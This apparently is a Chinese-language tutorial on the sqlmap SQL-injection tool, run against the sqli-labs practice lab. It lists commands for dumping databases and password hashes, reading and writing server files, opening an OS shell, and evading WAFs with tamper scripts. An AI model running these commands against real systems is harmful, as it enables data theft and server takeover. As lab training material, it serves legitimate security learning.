---
title: sqlmap使用
date: 2024-01-27
tags: [工具使用]
---

以sqli-labs靶场为例，学习sqlmap的各种命令的使用。
# sqlmap帮助命令
```bash
 -h, --help             简单命令
 -hh                   高级命令

<!-- more -->
 --version             版本查询
 -v                    0-6个等级（越大越详细，默认为1）
```
# sqlmap基本用法

指定目标：
```bash
 -u URL, --url=URL   目标 URL (e.g. "http://www.site.com/vuln.php?id=1")
 -d DIRECT           DIRECT连接字符串，用于直接连接数据库
 -l LOGFILE          指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描
 -m BULKFILE         扫描文本文件中给定的多个目标
 -r REQUESTFILE      从文件加载HTTP请求
 -g GOOGLEDORK       利用谷歌搜索引擎搭配正则来过滤你想要的
 -c CONFIGFILE       加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了                       配置文件sqlmap就会根据文件内容进行特定的扫描
```
常用命令：
```bash
sqlmap -r http.txt #http.txt是我们抓取的http的请求包 sqlmap -r http.txt -p username #指定参数，当有多个参数而你又知道username参数存在SQL漏洞，你就可以使用-p指定参数进行探测 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" #探测该url是否存在漏洞 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --cookie="抓取的cookie" #当该网站需要登录时，探测该url是否存在漏洞 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --data="uname=admin&passwd=admin&submit=Submit" #抓取其post提交的数据填入 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --users #查看数据库的所有用户
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --passwords #查看数据库用户名的密码
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-user #查看数据库当前的用户 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --is-dba #判断当前用户是否有管理员权限 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --roles #列出数据库所有管理员角色，仅适用于oracle数据库的时候 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dbs #爆出所有的数据库 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --tables #爆出所有的数据表 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --columns #爆出数据库中所有的列
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --current-db #查看当前的数据库
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --tables #爆出数据库security中的所有的表 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --columns #爆出security数据库中users表中的所有的列 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users -C username --dump #爆出数据库security中的users表中的username列中的所有数据 sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security -T users --dump-all #爆出数据库security中的users表中的所有数据 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" -D security --dump-all #爆出数据库security中的所有数据 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --dump-all #爆出该数据库中的所有数据
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --tamper=space2comment.py #指定脚本进行过滤，用/**/代替空格 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --level=5 --risk=3 #探测等级5，平台危险等级3，都是最高级别。当level=2时，会测试cookie注入。当level=3时，会测试user-agent/referer注入。 
sqlmap -u "http://192.168.10.1/sqli/Less-1/?id=1" --sql-shell #执行指定的sql语句
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --os-shell/--os-cmd #执行--os-shell命令，获取目标服务器权限 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-read "c:/test.txt" #读取目标服务器C盘下的test.txt文件 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --file-write test.txt --file-dest "e:/hack.txt" #将本地的test.txt文件上传到目标服务器的E盘下，并且名字为hack.txt sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --dbms="MySQL" #指定其数据库为mysql Firebird, HSQLDB, IBM DB2, Informix, Microsoft Access, Microsoft SQL Server, MySQL, Oracle, PostgreSQL, SAP MaxDB, SQLite, Sybase 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --random-agent #使用任意的User-Agent爆破 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --proxy="http://127.0.0.1:8080" #指定代理 
sqlmap -u "http://192.168.10.1/sqli/Less-4/?id=1" --technique T #指定时间延迟注入，这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式，当然，我们也可以直接手工指定。 
支持的探测方式如下： 　　
B: Boolean-based blind SQL injection（布尔型注入） 　　
E: Error-based SQL injection（报错型注入） 　　
U: UNION query SQL injection（可联合查询注入） 　　
S: Stacked queries SQL injection（可多语句查询注入） 　　
T: Time-based blind SQL injection（基于时间延迟注入） 
-v3 #输出详细度 最大值5 会显示请求包和回复包 
--threads 5 #指定线程数 
--fresh-queries #清除缓存 
--flush-session #清空会话，重构注入 
--batch #对所有的交互式的都是默认的 
--random-agent #任意的http头 
--tamper base64encode #对提交的数据进行base64编码 
--referer http://www.baidu.com #伪造referer字段 
--keep-alive 保持连接，当出现 [CRITICAL] connection dropped or unknown HTTP status code received. sqlmap is going to retry the request(s) 保错的时候，使用这个参数
```

# Sqlmap的高级用法
```shell
--identify-waf 检测是否有WAF
sqlmap --tamper=space2comment.py #用/**/代替空格 
sqlmap --tamper="space2comment.py,space2plus.py" 指定多个脚本进行过滤
```
过滤脚本在目录：/usr/share/sqlmap/tamper
